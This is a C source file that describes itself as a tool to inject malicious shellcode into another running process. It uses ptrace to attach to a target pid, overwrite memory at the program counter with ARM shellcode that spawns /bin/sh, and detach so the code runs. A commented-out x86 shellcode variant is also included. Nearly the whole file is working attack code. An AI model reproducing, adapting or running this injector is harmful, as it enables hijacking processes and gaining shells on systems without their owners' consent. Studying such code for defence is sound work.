/*
 * title:	jm_inject.c
 * author:	jm33_ng
 * purpose:	inject malicious code (in this case, a shell code) into another running process
 * note:	written 16/09/2020, modified by William A. Johnson on 08/07/2021
 * 		modified to work on ARM processor (added new payloads)
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

//#include <sys/reg.h>
#include <sys/user.h>

#define SHELLCODE_SIZE 28

//unsigned char* shellcode = "\x48\x31\xc0\x48\x89\xc2\x48\x89"
//                           "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
//                           "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
//                           "\x2f\x73\x68\x00\xcc\x90\x90\x90";

unsigned char* shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
			   "\x02\xa0\x49\x1a\x0a\x1c\xc2\x71"
			   "\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
			   "\x2f\x73\x68\x58";


int inject_data(pid_t pid, unsigned char* src, void* dst, int len){
	int i;
	uint32_t* s = (uint32_t*)src;
	uint32_t* d = (uint32_t*)dst;

	// The PTRACE_POKETEXT function works on words,
	// so we convert everything to word pointers (32bits) and we also increase i by 4.
	for(i = 0; i < len; i += 4, s++, d++){
		if((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0){
			perror("ptrace(POKETEXT):");
			return -1;
		}
	}
	return 0;
}

int main(int argc, char* argv[]){
	pid_t target;
	struct user_regs regs;
	int syscall;
	long dst;

	if(argc != 2){
		fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
		exit(1);
	}

	target = atoi(argv[1]);
	printf(":+ Tracing process %d\n", target);

	if((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0){
		perror("ptrace(ATTACH): ");
		exit(1);
	}

	printf("+ Waiting for process...\n");
	wait(NULL);

	printf("+ Getting Registers\n");
	if((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0){
		perror("ptrace(GETREGS):");
		exit(1);
	}

	/*inject code into the current RIP position */
	//this will execute the shellcode but leave the tracee in a dead state
	
	printf("+ Injecting shell code at %p\n", (void*)regs.uregs[15]);
	inject_data(target, shellcode, (void*)regs.uregs[15], SHELLCODE_SIZE);

	regs.uregs[15] += 2;  // PTRACE_DETATCH subtracts 2 bytes to the Instruction pointer
	printf("+ Setting instrcution pointer to %p\n", (void*)regs.uregs[15]);

	if((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0){
		perror("ptrace(GETREGS):");
		exit(1);
	}

	printf("+Run it!\n");
	

	//the shellcode will be run (as it's pointed to by RIP) after detaching
	if((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0){
		perror("ptrace(DETACH):");
		exit(1);
	}

	return 0;
}
